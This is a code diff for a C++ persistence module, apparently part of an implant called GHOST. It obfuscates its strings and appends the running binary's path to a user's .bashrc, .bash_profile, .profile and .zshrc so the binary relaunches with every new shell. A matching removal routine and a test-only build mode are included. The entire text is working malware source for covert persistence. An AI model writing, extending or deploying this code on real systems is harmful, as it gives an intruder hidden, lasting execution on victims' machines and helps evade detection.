@@ -2,30 +2,44 @@
 #include "utils/Logger.hpp"
 #include "utils/FileUtils.hpp"
 #include "utils/SystemUtils.hpp"
+#include "utils/Obfuscation.hpp"
 #include <filesystem>
+#include <vector>
 
 // TODO: add one-and-done option -> one successful rc persistence and return
-// TODO: track all files where persistence was established and remove only from them (less noisy than iterating over all again)
+
+RunControlMethod::RunControlMethod() {
+    std::string currentProc = SystemUtils::GetProcessPath();
+    this->payload = currentProc + OBFL(" &");
+
+    #ifdef IMPACT_LEVEL_TEST
+        targets.push_back({OBFL(".ghost_rc"), false});
+    #elif defined(IMPACT_LEVEL_USER) || defined(IMPACT_LEVEL_SYSTEM)
+        targets.push_back({OBFL(".bashrc"), false});
+        targets.push_back({OBFL(".bash_profile"), false});
+        targets.push_back({OBFL(".profile"), false});
+        targets.push_back({OBFL(".zshrc"), false});
+    #endif
+}
 
 bool RunControlMethod::install() {
-    const std::vector<std::string> RC_TARGETS = {
-        #ifdef DEBUG_MODE
-        ".test"
-        #else
-        ".bashrc",
-        ".bash_profile",
-        ".profile",
-        ".zshrc"
-        #endif
-    };
-    const std::string payload = "~/.ghost/GHOST &"; // TODO: make payloads parametrizable? (maybe even per file/file type)
-
     std::string home(SystemUtils::GetUserHome());
-    int successCount = 0;
 
     LOG_INFO("Attempting RunControl persistence")
 
-    for (const auto& target : RC_TARGETS) {
+    #ifdef IMPACT_LEVEL_TEST
+    if (!std::filesystem::exists(home + "/" + targets[0].first)) {
+        FileUtils::WriteFile(home + "/" + targets[0].first, payload);
+    }
+    #endif
+
+    int successCount = 0;
+    for (auto& [target, established] : this->targets) {
+        if (established) {
+            successCount++;
+            continue;
+        }
+
         std::string path = home + "/" + target;
 
         if (!std::filesystem::exists(path)) {
@@ -36,6 +50,7 @@ bool RunControlMethod::install() {
         LOG_INFO("Attempting persistence on {}", path)
         if (FileUtils::AppendToFile(path, payload)) {
             LOG_SUCCESS("Persistence established in {}", path)
+            established = true;
             successCount++;
         } else {
             LOG_ERROR("Error appending payload {} to file {}", payload, target)
@@ -52,24 +67,14 @@ bool RunControlMethod::install() {
 }
 
 bool RunControlMethod::remove() {
-    const std::vector<std::string> RC_TARGETS = {
-        #ifdef DEBUG_MODE
-        ".test"
-        #else
-        ".bashrc",
-        ".bash_profile",
-        ".profile",
-        ".zshrc"
-        #endif
-    };
-    const std::string payload = "~/.ghost/GHOST &"; // TODO: make payloads parametrizable? (maybe even per file/file type)
-
     std::string home(SystemUtils::GetUserHome());
-    int successCount = 0;
 
     LOG_INFO("Removing RunControl persistence")
 
-    for (const auto& target : RC_TARGETS) {
+    int removedCount = 0;
+    for (auto& [target, established] : this->targets) {
+        if (!established) continue;
+
         std::string path = home + "/" + target;
 
         if (!std::filesystem::exists(path)) {
@@ -80,17 +85,18 @@ bool RunControlMethod::remove() {
         LOG_INFO("Attempting to remove persistence from {}", path)
         if (FileUtils::RemoveFromFile(path, payload)) {
             LOG_SUCCESS("Persistence removed from {}", path)
-            successCount++;
+            established = false;
+            removedCount++;
         } else {
             LOG_ERROR("Error removing payload {} from file {}", payload, target)
         }
     }
 
-    if (successCount > 0) {
-        LOG_SUCCESS("[SUMMARY] Restored {} rc files", successCount)
+    if (removedCount > 0) {
+        LOG_SUCCESS("[SUMMARY] Restored {} rc files", removedCount)
     } else {
         LOG_ERROR("[SUMMARY] Failed to restore any rc files")
     }
 
-    return !(successCount > 0); // TODO: when TODO in lines 5-6 is implemented, return successCount == infectedCount or smth like this
+    return !(removedCount > 0); // TODO: when TODO in lines 5-6 is implemented, return removedCount == infectedCount or smth like this
 }
